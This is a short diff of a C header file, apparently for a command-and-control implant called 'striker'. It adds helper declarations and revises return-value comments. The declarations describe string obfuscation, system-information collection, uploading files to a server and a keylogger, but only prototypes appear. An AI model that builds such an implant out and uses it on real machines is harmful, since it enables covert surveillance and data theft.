@@ -26,6 +26,7 @@
 #include <time.h>
 #include <fcntl.h>
 #include <dirent.h>
+#include <sys/stat.h>
 #include "cJSON.h"
 #include "striker_utils.h"
 
@@ -74,11 +75,17 @@ typedef struct{
 // For decoding obfuscated strings.
 char *obfs_decode(char *str);
 
+// Generate a random alphanumeric string.
+char *random_str(size_t len);
+
 // Used for parsing URL.
 typedef enum {HTTP, HTTPS} URL_PROTO;
 
 // Extract the protocol, hostname, port, and path of a URL.
 void parse_url(char *url, URL_PROTO *proto, char *host, int *port, char *path);
+
+// Get the basename of a file path string.
+char *get_basename(char *path);
 
 /**
  * Make a GET request to `url`, save response body to `body`, and return the status code.
@@ -106,10 +113,10 @@ void get_url_host_port(char *url, char *host, int *port);
 // Return a json object containing system information.
 cJSON *sysinfo();
 
-// Handles task for uploading file to server. Returns 1 on success.
+// Handles task for uploading file to server. Returns 0 on success.
 short int upload_file(char *url, char *filename, FILE *rfo, buffer *result_buff);
 
-// Download a file from `url` and save to `wfo`. Returns 1 on success.
+// Download a file from `url` and save to `wfo`. Returns 0 on success.
 short int download_file(char *url, FILE *wfo, buffer *result_buff);
 
 // Starts the keylogger
